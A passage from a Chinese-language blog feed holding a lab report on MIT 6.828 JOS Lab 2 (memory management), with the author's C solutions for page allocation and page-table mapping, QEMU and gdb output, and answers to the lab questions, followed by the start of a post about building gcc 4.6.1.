class="comment">// set pp_ref to 0, set pp_link to last page_free_list</span></div><div class="line"><span class="comment">// and then update page_free_list</span></div><div class="line"><span class="keyword">for</span>(i = <span class="number">1</span> ; i &lt; npages_basemem ; i++) &#123;</div><div class="line">    pages[i].pp_ref = <span class="number">0</span>;</div><div class="line">    pages[i].pp_link = page_free_list;</div><div class="line">    page_free_list = &amp;pages[i];</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// calculate next free page and initialize corresponding pages entry</span></div><div class="line"><span class="comment">// convert from kernel virtual address to physical address</span></div><div class="line"><span class="keyword">size_t</span> next_free_page = PADDR(boot_alloc(<span class="number">0</span>)) / PGSIZE;</div><div class="line">pages[next_free_page].pp_link = &amp;pages[npages_basemem - <span class="number">1</span>];</div><div class="line">page_free_list = &amp;pages[next_free_page];</div><div class="line"></div><div class="line"><span class="comment">// initialize remaining pages entry</span></div><div class="line"><span class="keyword">for</span> (i = next_free_page + <span class="number">1</span> ; i &lt; npages ; i++) &#123;</div><div class="line">    pages[i].pp_ref = <span class="number">0</span>;</div><div class="line">    pages[i].pp_link = page_free_list;</div><div class="line">    page_free_list = &amp;pages[i];</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// In page_alloc():</span></div><div class="line"><span class="function">struct PageInfo *</span></div><div class="line"><span class="title">page_alloc</span><span class="params">(<span class="keyword">int</span> alloc_flags)</span></div><div class="line">&#123;</div><div class="line">	<span class="comment">// get first element in free list</span></div><div class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> * <span class="title">page_ptr</span> = <span class="title">page_free_list</span>;</span></div><div class="line">	<span class="keyword">if</span> (page_ptr != <span class="literal">NULL</span>) &#123;</div><div class="line">		<span class="comment">// NOT out of memory</span></div><div class="line">		<span class="comment">// update free list</span></div><div class="line">		page_free_list = page_free_list-&gt;pp_link;</div><div class="line">		<span class="comment">// get kernal virtual address from given page</span></div><div class="line">		<span class="keyword">char</span> * addr = page2kva(page_ptr);</div><div class="line">		<span class="comment">// set pp_link to NULL to allow double-free bugs check</span></div><div class="line">		page_ptr-&gt;pp_link = <span class="literal">NULL</span>;</div><div class="line">		<span class="comment">// ALLOC_ZERO set, use memset to initialze physical page</span></div><div class="line">		<span class="keyword">if</span> (alloc_flags &amp; ALLOC_ZERO) &#123;</div><div class="line">			<span class="built_in">memset</span>(addr, <span class="number">0</span>, PGSIZE);</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="comment">// return page</span></div><div class="line">		<span class="keyword">return</span> page_ptr;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// In page_free():</span></div><div class="line"><span class="function"><span class="keyword">void</span></span></div><div class="line"><span class="title">page_free</span><span class="params">(struct PageInfo *pp)</span></div><div class="line">&#123;</div><div class="line">	<span class="comment">// Fill this function in</span></div><div class="line">	<span class="comment">// Hint: You may want to panic if pp-&gt;pp_ref is nonzero or</span></div><div class="line">	<span class="comment">// pp-&gt;pp_link is not NULL.</span></div><div class="line"></div><div class="line">	<span class="comment">//check pp_ref and pp_link</span></div><div class="line">	<span class="keyword">if</span> (pp-&gt;pp_ref != <span class="number">0</span>) &#123;</div><div class="line">		panic(<span class="string">"page's reference count is non-zero!"</span>);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">if</span> (pp-&gt;pp_link != <span class="literal">NULL</span>) &#123;</div><div class="line">		panic(<span class="string">"double free error when free page!"</span>);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">// return page to free list</span></div><div class="line">	pp-&gt;pp_link = page_free_list;</div><div class="line">	page_free_list = pp;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>然后我们启动JOS，在终端观察到如下输出：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Physical memory: 131072K available, base = 640K, extended = 130432K</div><div class="line">check_page_free_list() succeeded!</div><div class="line">check_page_alloc() succeeded!</div></pre></td></tr></table></figure></p>
<p>证明内存分配器工作正常。</p>
<h3 id="第二部分-Virtual-Memory-虚拟内存"><a href="#第二部分-Virtual-Memory-虚拟内存" class="headerlink" title="第二部分 Virtual Memory - 虚拟内存"></a>第二部分 Virtual Memory - 虚拟内存</h3><p>练习2：阅读<a href="https://pdos.csail.mit.edu/6.828/2017/readings/i386/toc.htm" target="_blank" rel="external">Intel 80386 Reference Manual</a>的第五章和第六章。主要阅读页翻译和页保护机制的部分。同时，也要对x86的分段机制有所了解。</p>
<h4 id="虚拟地址、线性地址和物理地址"><a href="#虚拟地址、线性地址和物理地址" class="headerlink" title="虚拟地址、线性地址和物理地址"></a>虚拟地址、线性地址和物理地址</h4><p>在x86中，虚拟地址由段选择子和段内偏移组成，通过段翻译机制，得到线性地址。线性地址经过页翻译机制，得到物理地址。物理地址就是实际的内存位置。</p>
<p>在实验1中，我们已经将线性地址<code>0-4M</code>映射到了虚拟地址<code>0-4M</code>和<code>KERNBASE-KERNBASE+4M</code>。在本实验中，我们要将物理内存的低256M映射到从<code>KERNBASE</code>开始的虚拟地址。此外，我们还要映射其他几个虚拟地址空间。（<code>KERNBASE</code>为<code>0xf0000000</code>）</p>
<p>练习3：在QEMU监视器中使用<code>xp</code>命令检查物理内存<code>0x00100000</code>处的字，在gdb中使用<code>x</code>命令检查虚拟内存<code>0xf0100000</code>处的字，观察结果：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">(qemu) xp 0x00100000</div><div class="line">0000000000100000: 0x1badb002</div><div class="line">(gdb) x/x 0xf0100000</div><div class="line">0xf0100000 &lt;_start+4026531828&gt;: 0x1badb002</div></pre></td></tr></table></figure><br>可以得出，物理地址0x00100000和虚拟地址0xf0100000上具有相同的数据。</p>
<p><code>info pg</code>和<code>info mem</code>的输出如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">(qemu) info pg</div><div class="line">VPN range     Entry         Flags        Physical page</div><div class="line">[00000-003ff]  PDE[000]     ----A----P</div><div class="line">  [00000-00000]  PTE[000]     --------WP 00000</div><div class="line">  [00001-0009f]  PTE[001-09f] ---DA---WP 00001-0009f</div><div class="line">  [000a0-000b7]  PTE[0a0-0b7] --------WP 000a0-000b7</div><div class="line">  [000b8-000b8]  PTE[0b8]     ---DA---WP 000b8</div><div class="line">  [000b9-000ff]  PTE[0b9-0ff] --------WP 000b9-000ff</div><div class="line">  [00100-00103]  PTE[100-103] ----A---WP 00100-00103</div><div class="line">  [00104-00119]  PTE[104-119] --------WP 00104-00119</div><div class="line">  [0011a-0011a]  PTE[11a]     ---DA---WP 0011a</div><div class="line">  [0011b-0011c]  PTE[11b-11c] --------WP 0011b-0011c</div><div class="line">  [0011d-003ff]  PTE[11d-3ff] ---DA---WP 0011d-003ff</div><div class="line">[f0000-f03ff]  PDE[3c0]     ----A---WP</div><div class="line">  [f0000-f0000]  PTE[000]     --------WP 00000</div><div class="line">  [f0001-f009f]  PTE[001-09f] ---DA---WP 00001-0009f</div><div class="line">  [f00a0-f00b7]  PTE[0a0-0b7] --------WP 000a0-000b7</div><div class="line">  [f00b8-f00b8]  PTE[0b8]     ---DA---WP 000b8</div><div class="line">  [f00b9-f00ff]  PTE[0b9-0ff] --------WP 000b9-000ff</div><div class="line">  [f0100-f0103]  PTE[100-103] ----A---WP 00100-00103</div><div class="line">  [f0104-f0119]  PTE[104-119] --------WP 00104-00119</div><div class="line">  [f011a-f011a]  PTE[11a]     ---DA---WP 0011a</div><div class="line">  [f011b-f011c]  PTE[11b-11c] --------WP 0011b-0011c</div><div class="line">  [f011d-f03ff]  PTE[11d-3ff] ---DA---WP 0011d-003ff</div><div class="line"></div><div class="line">  (qemu) info mem</div><div class="line">  0000000000000000-0000000000400000 0000000000400000 -r-</div><div class="line">  00000000f0000000-00000000f0400000 0000000000400000 -rw</div></pre></td></tr></table></figure></p>
<p>在JOS内核中，<code>uintptr_t</code>代表虚拟地址，<code>physaddr_t</code>代表物理地址，它们都只是<code>uint32_t</code>的别名。因此，不能直接对其（int类型）解引用，需要先将其转换成指针类型。<br>对物理地址的解引用是错误的，因为MMU会将其当做虚拟地址，你将无法得到正确的内存内容。</p>
<p>问题1：<br>x的类型应当为<code>uintptr_t</code>，因为对其进行了解引用操作，所以x应当为虚拟地址。</p>
<p>有些时候，内核必须要处理物理地址，这也是要把0-4M映射到KERNBASE-KERNBASE+4M的理由。<br>为了能使内核读写物理地址，必须要加上KERNBASE，可以通过宏KADDR(pa)实现。<br>同理，有时候需要能通过虚拟地址找到物理地址，需要减去KERNBASE，可以通过宏PADDR(va)实现。</p>
<h4 id="引用计数"><a href="#引用计数" class="headerlink" title="引用计数"></a>引用计数</h4><p>在未来的实验中我们很可能将同样的物理页映射到多个虚拟地址，你需要在<code>struct PageInfo</code>的<code>pp_ref</code>域中保持物理页被引用的次数，当引用计数归0，页面不再被使用，可以被释放。<br>总的来说，引用计数应当等于物理页面在<code>UTOP</code>之下出现的次数（<code>UTOP</code>之上的物理页面大多在启动时被内核分配并且永远不应当被释放，所以不需要对其进行引用计数）。<br>我们也会用引用计数来追踪指向页目录页的指针数，以及页目录对页表页的引用数。</p>
<p>在使用<code>page_alloc()</code>时应当小心，返回页的<code>pp_ref</code>应当很快被递增，如被别的函数如(<code>page_insert()</code>)递增，在某些情况下，调用<code>page_insert()</code>的函数必须手动增加引用计数。</p>
<p>在练习4中遇到的问题总结如下：</p>
<ul>
<li>pgdir_walk在设置页表项时应当使用物理地址，在返回指针时应当返回虚拟地址。这是因为此时实际的二级页表还未被设置应用，且0-4M被映射为只读，而KERNBASE-KERNBASE+4M被映射为可读可写。需要使用给出的宏而不要自己加减</li>
<li>将PTE_P笔误成PTE_G</li>
<li>在page_insert中提前将引用计数pp_ref自增就可以避免边界情况的错误</li>
<li>pgdir_walk中对于页目录的设置可以更宽松，否则可能会对之后的实验产生影响</li>
</ul>
<p>练习4的代码如下，仅供参考：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// In pgdir_walk():</span></div><div class="line"><span class="keyword">pte_t</span> *</div><div class="line">pgdir_walk(<span class="keyword">pde_t</span> *pgdir, <span class="keyword">const</span> <span class="keyword">void</span> *va, <span class="keyword">int</span> create)</div><div class="line">&#123;</div><div class="line">	<span class="comment">// get page directory index and page directory entry</span></div><div class="line">	<span class="keyword">size_t</span> pgdir_index = PDX(va);</div><div class="line">	<span class="keyword">pde_t</span> pgdir_entry = pgdir[pgdir_index];</div><div class="line">	<span class="comment">// get page table index</span></div><div class="line">	<span class="keyword">size_t</span> pgtable_index = PTX(va);</div><div class="line">	<span class="keyword">if</span> ((pgdir_entry &amp; PTE_P) == <span class="number">1</span>) &#123;</div><div class="line">		<span class="comment">// page table page exists</span></div><div class="line">		<span class="comment">// get address of page table</span></div><div class="line">		<span class="keyword">pte_t</span> * pgtable = KADDR(PTE_ADDR(pgdir_entry));</div><div class="line">		<span class="keyword">return</span> (<span class="keyword">pte_t</span> *)(pgtable + pgtable_index);</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		<span class="comment">// page table page doesn't exist</span></div><div class="line">		<span class="keyword">if</span> (create == <span class="literal">false</span>) &#123;</div><div class="line">			<span class="comment">// create flag is false, returns NULL</span></div><div class="line">			<span class="keyword">return</span> <span class="literal">NULL</span>;</div><div class="line">		&#125; <span class="keyword">else</span> &#123;</div><div class="line">			<span class="comment">// allocate a new page table page</span></div><div class="line">			struct PageInfo * page = page_alloc(ALLOC_ZERO);</div><div class="line">			<span class="keyword">if</span> (page == <span class="literal">NULL</span>) &#123;</div><div class="line">				<span class="comment">// allocation fails</span></div><div class="line">				<span class="keyword">return</span> <span class="literal">NULL</span>;</div><div class="line">			&#125; <span class="keyword">else</span> &#123;</div><div class="line">				<span class="comment">// increase physical page's reference count</span></div><div class="line">				page-&gt;pp_ref++;</div><div class="line">				<span class="comment">// get physical address of physical page</span></div><div class="line">				<span class="keyword">physaddr_t</span> page_pa = page2pa(page);</div><div class="line">				<span class="comment">// insert page table into page directory</span></div><div class="line">				pgdir[pgdir_index] = page_pa | PTE_W | PTE_U | PTE_P;</div><div class="line">				<span class="comment">// NB: returns KERNEL VIRTUAL ADDRESS here, for 0-4M is NOT writable</span></div><div class="line">				<span class="keyword">return</span> (<span class="keyword">pte_t</span> *)page2kva(page) + pgtable_index;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// In boot_map_region():</span></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></div><div class="line"><span class="title">boot_map_region</span><span class="params">(<span class="keyword">pde_t</span> *pgdir, <span class="keyword">uintptr_t</span> va, <span class="keyword">size_t</span> size, <span class="keyword">physaddr_t</span> pa, <span class="keyword">int</span> perm)</span></div><div class="line">&#123;</div><div class="line">	<span class="comment">// round up size</span></div><div class="line">	size = ROUNDUP(size, PGSIZE);</div><div class="line">	<span class="comment">// get the number of pages to be mapped</span></div><div class="line">	<span class="keyword">size_t</span> page_num = PGNUM(size);</div><div class="line"></div><div class="line">	<span class="keyword">size_t</span> i;</div><div class="line">	<span class="keyword">for</span> (i = <span class="number">0</span> ; i &lt; page_num ; i++) &#123;</div><div class="line">		<span class="comment">// iterate through to get each pte_t * through pgdir_walk given virtual address</span></div><div class="line">		<span class="keyword">pte_t</span> * pgtable_entry_ptr = pgdir_walk(pgdir,(<span class="keyword">char</span> *)(va + i * PGSIZE), <span class="literal">true</span>);</div><div class="line">		<span class="comment">// set pte_t according to physical address and permission flags</span></div><div class="line">		*pgtable_entry_ptr = (pa + i * PGSIZE) | perm | PTE_P;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// In page_lookup():</span></div><div class="line"><span class="function">struct PageInfo *</span></div><div class="line"><span class="title">page_lookup</span><span class="params">(<span class="keyword">pde_t</span> *pgdir, <span class="keyword">void</span> *va, <span class="keyword">pte_t</span> **pte_store)</span></div><div class="line">&#123;</div><div class="line">	<span class="comment">// Fill this function in</span></div><div class="line">	<span class="keyword">pte_t</span> * pgtable_entry_ptr = pgdir_walk(pgdir, va, <span class="literal">false</span>);</div><div class="line">	<span class="keyword">if</span> (pgtable_entry_ptr &amp;&amp; ((*pgtable_entry_ptr) &amp; PTE_P) == <span class="number">1</span>) &#123;</div><div class="line">		<span class="keyword">if</span> (pte_store != <span class="literal">NULL</span>) &#123;</div><div class="line">			<span class="comment">// pte_store not zero, store the address of pte of the page in it</span></div><div class="line">			*pte_store = pgtable_entry_ptr;</div><div class="line">		&#125;</div><div class="line">		<span class="comment">// converts from pa to page and returns</span></div><div class="line">		<span class="keyword">physaddr_t</span> pa = PTE_ADDR(*pgtable_entry_ptr);</div><div class="line">		<span class="keyword">return</span> pa2page(pa);</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		<span class="comment">// no page mapped at va</span></div><div class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// In page_remove():</span></div><div class="line"><span class="function"><span class="keyword">void</span></span></div><div class="line"><span class="title">page_remove</span><span class="params">(<span class="keyword">pde_t</span> *pgdir, <span class="keyword">void</span> *va)</span></div><div class="line">&#123;</div><div class="line">	<span class="comment">// Fill this function in</span></div><div class="line">	<span class="keyword">pte_t</span> * pgtable_entry_ptr = <span class="literal">NULL</span>;</div><div class="line">	<span class="comment">// use page_lookup to get struct PageInfo</span></div><div class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> * <span class="title">page</span> = <span class="title">page_lookup</span>(<span class="title">pgdir</span>, <span class="title">va</span>, &amp;<span class="title">pgtable_entry_ptr</span>);</span></div><div class="line">	<span class="keyword">if</span> (page &amp;&amp; pgtable_entry_ptr) &#123;</div><div class="line">		<span class="comment">// if page mapped at va</span></div><div class="line">		<span class="comment">// decrease and try to free page</span></div><div class="line">		page_decref(page);</div><div class="line">		<span class="comment">// set page table entry to 0</span></div><div class="line">		*pgtable_entry_ptr = <span class="number">0</span>;</div><div class="line">		<span class="comment">// invalidate tlb</span></div><div class="line">		tlb_invalidate(pgdir, va);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// In page_insert():</span></div><div class="line"><span class="function"><span class="keyword">int</span></span></div><div class="line"><span class="title">page_insert</span><span class="params">(<span class="keyword">pde_t</span> *pgdir, struct PageInfo *pp, <span class="keyword">void</span> *va, <span class="keyword">int</span> perm)</span></div><div class="line">&#123;</div><div class="line">	<span class="comment">// Fill this function in</span></div><div class="line">	<span class="comment">// try to get pointer to page table entry, created if needed</span></div><div class="line">	<span class="keyword">pte_t</span> * pgtable_entry_ptr = pgdir_walk(pgdir, va, <span class="literal">true</span>);</div><div class="line">	<span class="keyword">if</span> (!pgtable_entry_ptr) &#123;</div><div class="line">		<span class="comment">// page table cannot be allocated</span></div><div class="line">		<span class="keyword">return</span> -E_NO_MEM;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">// increase reference ahead of insertion to process CORNER CASE</span></div><div class="line">	pp-&gt;pp_ref++;</div><div class="line"></div><div class="line">	<span class="keyword">if</span> (((*pgtable_entry_ptr) &amp; PTE_P) != <span class="number">0</span>) &#123;</div><div class="line">		<span class="comment">// exists page mapped at va</span></div><div class="line">		<span class="comment">// remove page and invalidate tlb</span></div><div class="line">		page_remove(pgdir, va);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">// get physical address of page</span></div><div class="line">	<span class="keyword">physaddr_t</span> pa = page2pa(pp);</div><div class="line">	<span class="comment">// insert page into page table</span></div><div class="line">	*pgtable_entry_ptr = pa | perm | PTE_P;</div><div class="line"></div><div class="line">	<span class="comment">// update permission flags of corresponding page directory</span></div><div class="line">	pgdir[PDX(va)] = pgdir[PDX(va)] | perm;</div><div class="line"></div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h3 id="第三部分-Kernel-Address-Space-内核地址空间"><a href="#第三部分-Kernel-Address-Space-内核地址空间" class="headerlink" title="第三部分 Kernel Address Space - 内核地址空间"></a>第三部分 Kernel Address Space - 内核地址空间</h3><p>JOS将32位的地址空间划为了两部分——用户环境（在Lab3中加载和运行）将控制低地址空间、而内核总是完全地控制高地址空间，由ULIM显式地划分地址空间。内核将占据约256M的地址空间。</p>
<p>尽管内核和用户内存位于同一地址空间，我们仍然要在x86的页表中使用权限位去保证用户代码仅能访问低地址空间。否则用户代码可能会覆写内核数据，导致故障。此外，用户代码还可能能从窃取其他用户、内核的私有数据。<br>在JOS中，用户环境将不具有ULIM以上任何内存的权限；只有内核可以读写这些内存。对于[UTOP, ULIM)，内核和用户都仅能读而不能写，该段内存主要用于向用户暴露某些内核的只读数据结构；最后，UTOP以下的地址空间由用户环境使用，由用户环境自行设置这些内存的权限。</p>
<p>练习5的代码如下，仅供参考：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//////////////////////////////////////////////////////////////////////</span></div><div class="line"><span class="comment">// Now we set up virtual memory</span></div><div class="line"></div><div class="line"><span class="comment">//////////////////////////////////////////////////////////////////////</span></div><div class="line"><span class="comment">// Map 'pages' read-only by the user at linear address UPAGES</span></div><div class="line"><span class="comment">// Permissions:</span></div><div class="line"><span class="comment">//    - the new image at UPAGES -- kernel R, user R</span></div><div class="line"><span class="comment">//      (ie. perm = PTE_U | PTE_P)</span></div><div class="line"><span class="comment">//    - pages itself -- kernel RW, user NONE</span></div><div class="line"><span class="comment">// Your code goes here:</span></div><div class="line">boot_map_region(kern_pgdir, UPAGES, pages_size, PADDR(pages), PTE_U | PTE_P);</div><div class="line"></div><div class="line"><span class="comment">//////////////////////////////////////////////////////////////////////</span></div><div class="line"><span class="comment">// Use the physical memory that 'bootstack' refers to as the kernel</span></div><div class="line"><span class="comment">// stack.  The kernel stack grows down from virtual address KSTACKTOP.</span></div><div class="line"><span class="comment">// We consider the entire range from [KSTACKTOP-PTSIZE, KSTACKTOP)</span></div><div class="line"><span class="comment">// to be the kernel stack, but break this into two pieces:</span></div><div class="line"><span class="comment">//     * [KSTACKTOP-KSTKSIZE, KSTACKTOP) -- backed by physical memory</span></div><div class="line"><span class="comment">//     * [KSTACKTOP-PTSIZE, KSTACKTOP-KSTKSIZE) -- not backed; so if</span></div><div class="line"><span class="comment">//       the kernel overflows its stack, it will fault rather than</span></div><div class="line"><span class="comment">//       overwrite memory.  Known as a "guard page".</span></div><div class="line"><span class="comment">//     Permissions: kernel RW, user NONE</span></div><div class="line"><span class="comment">// Your code goes here:</span></div><div class="line">boot_map_region(kern_pgdir, KSTACKTOP - KSTKSIZE, KSTKSIZE, PADDR(bootstack), PTE_W | PTE_P);</div><div class="line"></div><div class="line"><span class="comment">//////////////////////////////////////////////////////////////////////</span></div><div class="line"><span class="comment">// Map all of physical memory at KERNBASE.</span></div><div class="line"><span class="comment">// Ie.  the VA range [KERNBASE, 2^32) should map to</span></div><div class="line"><span class="comment">//      the PA range [0, 2^32 - KERNBASE)</span></div><div class="line"><span class="comment">// We might not have 2^32 - KERNBASE bytes of physical memory, but</span></div><div class="line"><span class="comment">// we just set up the mapping anyway.</span></div><div class="line"><span class="comment">// Permissions: kernel RW, user NONE</span></div><div class="line"><span class="comment">// Your code goes here:</span></div><div class="line">boot_map_region(kern_pgdir, KERNBASE, <span class="number">0xffffffff</span> - KERNBASE, <span class="number">0</span>, PTE_W | PTE_P);</div></pre></td></tr></table></figure></p>
<p>问题2：</p>
<table>
<thead>
<tr>
<th style="text-align:center">Enrty</th>
<th style="text-align:center">Base Virtual Address</th>
<th style="text-align:center">Points to (logically)</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1023</td>
<td style="text-align:center">0xFFC00000</td>
<td style="text-align:center">Physical Memory</td>
</tr>
<tr>
<td style="text-align:center">…</td>
<td style="text-align:center">……….</td>
<td style="text-align:center">…</td>
</tr>
<tr>
<td style="text-align:center">960</td>
<td style="text-align:center">0xF0000000</td>
<td style="text-align:center">First 4 MB on Physical Memory</td>
</tr>
<tr>
<td style="text-align:center">959</td>
<td style="text-align:center">0xEFC00000</td>
<td style="text-align:center">Kernel Stack</td>
</tr>
<tr>
<td style="text-align:center">957</td>
<td style="text-align:center">0xEF400000</td>
<td style="text-align:center">Kernel Page Directory</td>
</tr>
<tr>
<td style="text-align:center">956</td>
<td style="text-align:center">0xEF000000</td>
<td style="text-align:center">Pages</td>
</tr>
</tbody>
</table>
<p>问题3：<br>页保护机制实现了这一点，用户将不能访问未设置<code>PTE_U</code>的页（对于页目录和页表皆是如此）。</p>
<p>问题4：<br>注意到pages最多只有4MB，而一个<code>struct PageInfo</code>为8字节（对齐），所以实际上最多只有512K个项，总大小为2GB。</p>
<p>问题5：<br>使用了页表来管理虚拟内存，页表完整地映射了4GB的地址空间。使用pages追踪物理页面的情况，由于最初只映射了4MB，使得内存被限制在了2GB。</p>
<p>问题6：<br>执行转换的代码在<code>entry.S</code>中，和32位保护模式时相似：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mov	$relocated, %eax</div><div class="line">jmp	*%eax</div></pre></td></tr></table></figure><br>实际的跳转是通过一次<code>jmp</code>实现的，得以继续执行的原因是我们不仅将0-4M映射到了<code>KERNBASE-KERNBASE+4M</code>的读写，同时也映射到了<code>0-4M</code>的只读。不这么做的话将出现无法处理的<code>SIGTRAP</code>信号而导致系统Triple Fault。<br>不通过转换就无法在高地址执行内核代码，将内核映射在高地址主要是为了完整地映射内核的约256M空间。</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;寒假在家终于有时间继续处理上学期没有做完的Labs，虽然效率偏低但总不是完全没有进展。&lt;br&gt;Lab2 - Memory Management主要包括了操作系统的内存管理，具体来说可以分为两部分。第一部分需要编写内核的物理内存分配器（Physica
    
    </summary>
    
      <category term="操作系统" scheme="http://blog.codedragon.tech/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="操作系统" scheme="http://blog.codedragon.tech/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
      <category term="实验" scheme="http://blog.codedragon.tech/tags/%E5%AE%9E%E9%AA%8C/"/>
    
      <category term="内存管理" scheme="http://blog.codedragon.tech/tags/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>gcc4.6.1编译问题总结以及modules的使用</title>
    <link href="http://blog.codedragon.tech/2018/02/01/gcc4-6-1%E7%BC%96%E8%AF%91%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93%E4%BB%A5%E5%8F%8Amodules%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>http://blog.codedragon.tech/2018/02/01/gcc4-6-1编译问题总结以及modules的使用/</id>
    <published>2018-02-01T09:13:52.000Z</published>
    <updated>2018-02-03T15:47:52.066Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在<a href="http://blog.codedragon.tech/2017/12/09/MIT6-828%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%B7%A5%E7%A8%8BLab1-Booting-a-PC%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/">MIT6.828操作系统工程Lab1-Booting a PC实验报告</a>中，出现了高版本gcc(&gt; 7.1.1-3)编译出的JOS内核不能使用的问题（Triple Fault）。此外，gcc无法编译生成32位的JOS内核。因此需要手动降级到低版本并且开启gcc-multilib。</p>
<blockquote>
